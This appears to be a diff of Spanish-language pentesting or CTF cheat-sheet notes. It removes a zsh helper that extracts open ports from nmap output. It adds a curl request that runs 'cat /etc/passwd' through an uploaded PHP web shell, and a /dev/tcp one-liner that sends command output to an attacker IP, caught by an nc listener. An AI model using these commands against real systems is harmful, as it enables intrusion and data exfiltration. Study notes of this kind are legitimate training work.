@@ -41,23 +41,19 @@
 cat archivazo.txt | xclip -sel clip
 ```
 
-- Función a pegar en la **.zshrc**  para copiar pueros extraídos --> **cliports**
-> nmap -p- target -oG ***nombresalidanmap***
-   Uso: cliports ***nombredesalidanmap***
-
-```bash
-cliports () {
-	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
-	ip_address="$(cat $1 | grep -oP '^Host: .* \(\)' | head -n 1 | awk '{print $2}' )"
-	echo -e "\n[*] Extracting information ... \n" > extractPorts. tmp
-	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
-	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
-	echo $ports | tr -d '\n' | xclip -sel clip
-	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
-	cat extractPorts. tmp
-	rm extractPorts. tmp
-}
-```
 
 - **ctrl+ u** en una web para que salga un json o cualquier archivo con un formato correcto
 - si un user pertenece al grupo **adm**, será capaz de ver los logs de cualquier app
+- Para URL encodear y mandar data como con **--data** con curl
+```bash
+curl -s -X GET "http://localhost:puerto/upload/archivo.php" -G --data-urlencode "cmd=cat /etc/passwd"
+```
+
+- PAra enviar comandos a un puerto en escucha
+
+
+
+```bash
+`whoami > /dev/tcp/ipatacante/8080 0>&1`
+nc -nlvp 8080
+```
